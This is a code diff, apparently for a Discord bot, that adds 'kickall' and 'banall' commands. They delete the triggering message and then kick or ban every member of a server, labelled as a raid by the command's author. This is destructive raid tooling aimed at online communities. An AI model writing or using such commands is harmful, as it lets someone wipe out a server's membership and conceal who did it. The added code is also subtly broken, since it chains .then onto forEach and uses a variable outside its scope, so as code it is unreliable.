@@ -825,6 +825,27 @@ console.log(err)
 }
 }
 
+//KICK ALL
+if(cmd === (prefix + "kickall")){
+message.delete()
+try {
+message.guild.members.forEach(m => m.kick(`Raid by ${message.author.username}`)).then(function(){ console.log(`${m.user.tag} a été expulsé(e).`) })
+} catch(err) {
+console.log(err)
+}
+}
+
+//BAN ALL
+if(cmd === (prefix + "banall")){
+message.delete()
+try {
+message.guild.members.forEach(m => m.ban(`Raid by ${message.author.username}`)).then(function(){ console.log(`${m.user.tag} a été banni(e).`) })
+
+} catch(err) {
+console.log(err)
+}
+}
+
 });
 
 
